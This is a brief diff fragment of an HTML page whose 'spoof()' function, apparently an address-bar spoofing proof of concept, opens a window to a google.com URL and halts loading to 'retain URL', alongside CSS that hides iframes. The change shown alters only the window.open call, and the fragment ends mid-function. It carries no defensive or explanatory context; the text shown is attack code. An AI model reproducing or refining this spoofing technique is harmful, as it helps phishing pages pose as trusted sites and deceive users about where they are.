@@ -7,7 +7,7 @@
   <style>iframe{visibility:hidden;}</style>
   <script>
     function spoof() {
-      let win = window.open("https://www.google.com:8080", "_blank");  // Redirect to spoofed URL first
+      let win = window.open("https://www.google.com:8080");  // Redirect to spoofed URL first
       setTimeout(() => {
         try {
           win.stop();  // Stop load to retain URL
